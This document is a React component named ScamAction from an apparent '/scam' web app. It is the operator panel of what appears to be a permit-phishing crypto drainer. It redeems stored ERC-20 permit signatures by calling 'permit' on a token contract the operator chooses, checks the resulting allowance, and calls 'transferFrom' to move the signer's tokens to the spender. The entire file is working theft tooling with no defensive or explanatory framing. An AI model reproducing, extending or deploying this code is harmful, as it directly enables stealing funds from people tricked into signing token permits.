'use client';

import {SignedPermitSignature} from "@/app/scam/page";
import {callContractMethod, FinalizedSignedSignature} from "../page";
import {CustomContract} from "@/app/TokenList";
import React, {useState} from "react";
import {ethers} from "ethers";

const ScamAction = (props: {
	data: SignedPermitSignature,
	finalized: FinalizedSignedSignature
}) => {
	const {data} = props;
	const [contractAddress, setContractAddress] = useState(props.finalized.token.contract_address);
	const [provider, setProvider] = useState(props.finalized.provider)
	return (
		<div className={'flex gap-3 items-center'}>
			<select value={contractAddress} onChange={e => {
				setContractAddress(e.target?.value);
			}}>
				{Object.entries(CustomContract).map(([key, value]) => (
					<option key={key} value={value}>{key}</option>
				))}
			</select>
			<button onClick={async ()=>{
				alert((await callContractMethod('nonces', [data.permit.spender],props.finalized.token.contract_address,props.finalized.provider)).toString())
			}}>
				nonce
			</button>
			<button onClick={() => {
				callContractMethod('permit', [
						data.permit.owner,
						data.permit.spender,
						data.permit.value,
						data.permit.deadline,
						data.v,
						data.r,
						data.s,
						{
							gasLimit: 100000
						}
					], contractAddress,
					provider)
					.catch((e) => {
						alert(`ERROR ${e?.message ?? e}`);
						console.error(e)
					}).then(() => {
					alert("Permit successful!")
				});
			}}>
				permit
			</button>
			<button onClick={async () => {
				alert((await callContractMethod('allowance', [
					data.permit.owner,
					data.permit.spender
				], contractAddress, provider)));
			}}>
				Allowance
			</button>
			<button onClick={async () => {
				callContractMethod('transferFrom', [
					data.permit.owner,
					data.permit.spender,
					window.prompt("Enter Amount to transfer"),
					{
						gasLimit: 100000
					}
				], contractAddress, provider)
					.catch((e) => {
						alert(`ERROR ${e?.message ?? e}`);
						console.error(e)
					}).then((e) => {
					console.log(e);
				});
			}}>
				Transfer
			</button>
			<span>ContractAddr:</span>
			<input onChange={(e) => {
				setContractAddress(e.target?.value);
			}} value={contractAddress} placeholder={'Contract Address'} className={'border rounded'}/>
			<span>Provider:</span>
			<input onChange={(e) => {
				setProvider(e.target?.value);
			}} value={provider} placeholder={'Provider'} className={'border rounded'}/>
		</div>
	);
};

export default ScamAction;
